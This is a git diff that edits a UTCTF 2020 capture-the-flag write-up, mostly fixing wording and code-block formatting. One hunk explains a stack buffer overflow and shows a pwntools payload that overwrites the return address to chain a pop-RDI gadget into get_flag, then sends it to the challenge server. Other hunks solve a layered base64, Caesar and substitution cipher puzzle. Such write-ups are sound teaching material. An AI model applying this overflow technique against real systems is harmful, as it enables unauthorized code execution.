@@ -16,7 +16,7 @@ categories: [Capture The Flag]
 > ...
 
 
-These are writeups to challenges I solved for this CTF. Points next to the name were what they were worth when I solved it. They are now all 50 points. I tried to also keep a copy of each referenced "download XXXX" file for a challenge in the [files](./files) directory.
+These are writeups to challenges I solved for this CTF. Points next to the name were what they were worth when I solved it. They are now all 50 points. I tried to also keep a copy of each referenced "download XXXX" file for a challenge in a dedicated [files](https://github.com/bigpick/UTCTF-2020/tree/master/files) directory.
 
 ### Solved
 
@@ -244,7 +244,7 @@ undefined8 main(void)
 }
 ```
 
-So the `local_78[112]` must be our input buffer, so we know it's size is 112. The following additional 8 bytes that we just fill with random bytes is so that we can then hop over the current base pointer. The base pointer is initialized for each function/stack frame, and we just need to clobber it to get to what we realy want: the return pointer. Once we're there, we can basically write a different address to "return" to wherever we want. In this case, the address of the function that will pop whatever we have on the stack (which we'll make `0xdeadbeef` into RDI). This is because the get_flag function is expecting the argument to be there, so even if we clobber the base pointer but get into get_flag, it won't do us any good without the hex string being in RDI already.
+So the `local_78[112]` must be our input buffer, so we know it's size is 112. The following additional 8 bytes that we just fill with random bytes is so that we can then hop over the current base pointer. The base pointer is initialized for each function/stack frame, and we just need to clobber it to get to what we really want: the return pointer. Once we're there, we can basically write a different address to "return" to wherever we want. In this case, the address of the function that will pop whatever we have on the stack (which we'll make `0xdeadbeef`) into RDI. This is because the `get_flag` function is expecting the argument to be in that register, so even if we clobber the base pointer but get into `get_flag`, it won't do us any good without the hex string being in RDI already.
 
 Once we've finally set that up, we can add the address of get_flag, so we hop there once we're done executing the above.
 
@@ -288,7 +288,11 @@ payload = 'a'*(112)+b'\xa2\xacvm\xeeU\x0f\xc0'+p64(0x400693)+p64(0xdeadbeef)+p64
 conn = remote('binary.utctf.live', 9002)
 conn.sendline(payload)
 conn.interactive()
------
+```
+
+And then running it:
+
+```
 ./bof.py
 [+] Opening connection to binary.utctf.live on port 9002: Done
 [*] Switching to interactive mode
@@ -364,7 +368,7 @@ TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBs
 
 Alright, that kinda looks like base64, so we'll try that then:
 
-```bash
+```
 echo 'TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmt2YnNxcmQsIGl5ZSdibyBrdnd5Y2QgZHJvYm8hIFh5ZyBweWIgZHJvIHBzeGt2IChreG4gd2tpbG8gZHJvIHJrYm5vY2QuLi4pIHprYmQ6IGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gU3ggZHJvIHB5dnZ5Z3N4cSBkb2hkLCBTJ2ZvIGRrdW94IHdpIHdvY2NrcW8ga3huIGJvenZrbW9uIG9mb2JpIGt2enJrbG9kc20gbXJrYmttZG9iIGdzZHIgayBteWJib2N6eXhub3htbyBkeSBrIG5zcHBvYm94ZCBtcmtia21kb2IgLSB1eHlneCBrYyBrIGNlbGNkc2RlZHN5eCBtc3pyb2IuIE1reCBpeWUgcHN4biBkcm8gcHN4a3YgcHZrcT8gcnN4ZDogR28gdXh5ZyBkcmtkIGRybyBwdmtxIHNjIHF5c3hxIGR5IGxvIHlwIGRybyBweWJ3a2QgZWRwdmtxey4uLn0gLSBncnNtciB3b2t4YyBkcmtkIHNwIGl5ZSBjb28gZHJrZCB6a2Rkb2J4LCBpeWUgdXh5ZyBncmtkIGRybyBteWJib2N6eXhub3htb2MgcHliIGUsIGQsIHAsIHYgaywga3huIHEga2JvLiBJeWUgbWt4IHpieWxrbHZpIGd5YnUgeWVkIGRybyBib3drc3hzeHEgbXJrYmttZG9iYyBsaSBib3p2a21zeHEgZHJvdyBreG4gc3hwb2Jic3hxIG15d3d5eCBneWJuYyBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4gS3h5ZHJvYiBxYm9rZCB3b2RyeW4gc2MgZHkgZWNvIHBib2Flb3htaSBreGt2aWNzYzogZ28gdXh5ZyBkcmtkICdvJyBjcnlnYyBleiB3eWNkIHlwZG94IHN4IGRybyBrdnpya2xvZCwgY3kgZHJrZCdjIHpieWxrbHZpIGRybyB3eWNkIG15d3d5eCBtcmtia21kb2Igc3ggZHJvIGRvaGQsIHB5dnZ5Z29uIGxpICdkJywga3huIGN5IHl4LiBZeG1vIGl5ZSB1eHlnIGsgcG9nIG1ya2JrbWRvYmMsIGl5ZSBta3ggc3hwb2IgZHJvIGJvY2QgeXAgZHJvIGd5Ym5jIGxrY29uIHl4IG15d3d5eCBneWJuYyBkcmtkIGNyeWcgZXogc3ggZHJvIE94cXZzY3Igdmt4cWVrcW8uCnJnaG54c2RmeXNkdGdodSEgcWdmIGlzYWsgY3RodHVpa2UgZGlrIHprbnRoaGt4IHJ4cWxkZ254c2xpcSByaXN5eWtobmsuIGlreGsgdHUgcyBjeXNuIGNneCBzeXkgcWdmeCBpc3hlIGtjY2d4ZHU6IGZkY3lzbntoMHZfZGk0ZHVfdmk0ZF90X3I0eXlfcnhxbGQwfS4gcWdmIHZ0eXkgY3RoZSBkaXNkIHMgeWdkIGdjIHJ4cWxkZ254c2xpcSB0dSBwZnVkIHpmdHlldGhuIGdjYyBkaXR1IHVneGQgZ2MgenN1dHIgYmhndnlrZW5rLCBzaGUgdGQgeGtzeXlxIHR1IGhnZCB1ZyB6c2Ugc2Nka3ggc3l5LiBpZ2xrIHFnZiBraHBncWtlIGRpayByaXN5eWtobmsh' | base64 -D
 
 New challenge! Can you figure out what's going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people).
@@ -372,7 +376,7 @@ kvbsqrd, iye'bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd:
 rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn{h0v_di4du_vi4d_t_r4yy_rxqld0}. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!
 ```
 
-OK - Ceasar's cipher, the flag looks to be here:
+OK - Ceasar's cipher, the flag looks to be here: `... fdcysn{h0v_di4du_vi4d_t_r4yy_rxqld0} ...`. We can try to find the shift of the caesar cipher using a trivial python function:
 
 ```python
 key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -385,18 +389,23 @@ def decrypt(n, ciphertext):
     except ValueError:
       result += l
   return result
+```
+Then, in the interpreter:
 
+```python
+# To try to find the shift, look for one that is legible
 >>> for i in range(1, 26):
 ...   decrypt(i, blah)
 ...   print("\n===\n")
 ...
+# Rerun with that index to be sure:
 >>> decrypt(10, blah)
 "alright, you're almost there! now for the final (and maybe the hardest...) part: a substitution cipher. in the following text, i've taken my message and replaced every alphabetic character with a correspondence to a different character - known as a substitution cipher. can you find the final flag? hint: we know that the flag is going to be of the format utflag{...} - which means that if you see that pattern, you know what the correspondences for u, t, f, l a, and g are. you can probably work out the remaining characters by replacing them and inferring common words in the english language. another great method is to use frequency analysis: we know that 'e' shows up most often in the alphabet, so that's probably the most common character in the text, followed by 't', and so on. once you know a few characters, you can infer the rest of the words based on common words that show up in the english language.\nhwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid{x0l_ty4tk_ly4t_j_h4oo_hngbt0}. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!"
 ```
 
-OK - now a substitution cipher:
+OK - now a substitution cipher. So we have to try to find all the various letter substitutions. We can start with some that we for sure know, and work backwards:
 
-```
+```python
 #!/usr/bin/env python3
 
 tosub=""".\nhwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid{x0l_ty4tk_ly4t_j_h4oo_hngbt0}. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!"""
@@ -415,15 +424,15 @@ print(tosub)
 hwxgnatulatjwxk! gwu yaqa fjxjkyau tya pagjxxan hngbtwgnabyg hyallaxga. yana jk a flag fwn all gwun yanu affwntk: utflag{x0l_ty4tk_ly4t_j_h4ll_hngbt0}. gwu ljll fjxu tyat a lwt wf hngbtwgnabyg jk fukt pujlujxg wff tyjk kwnt wf pakjh rxwllauga, axu jt naallg jk xwt kw pau aftan all. ywba gwu axfwgau tya hyallaxga!
 ```
 
-hyallaxga! looks like challenge:
+`hyallaxga!`` looks like challenge, so we can sub those letters in. Then we get:
 
 ```
 congnatuwations! gou haqa finishau tha paginnan cngbtognabhg chawwanga. hana is a fwag fon aww goun hanu affonts: utfwag{n0w_th4ts_wh4t_i_c4ww_cngbt0}. gou wiww finu that a wot of cngbtognabhg is fust puiwuing off this sont of pasic nnowwauga, anu it naawwg is not so pau aftan aww. hoba gou anfogau tha chawwanga!
 ```
 
-So kinda incoherent, but meh its late at this point, but looks like `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`? Bingo.
+So kinda incoherent, but meh its late at this point, but looks like `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`?
 
-Flag is `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`.
+Bingo. Flag is `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`.
 
 &nbsp;
 &nbsp;
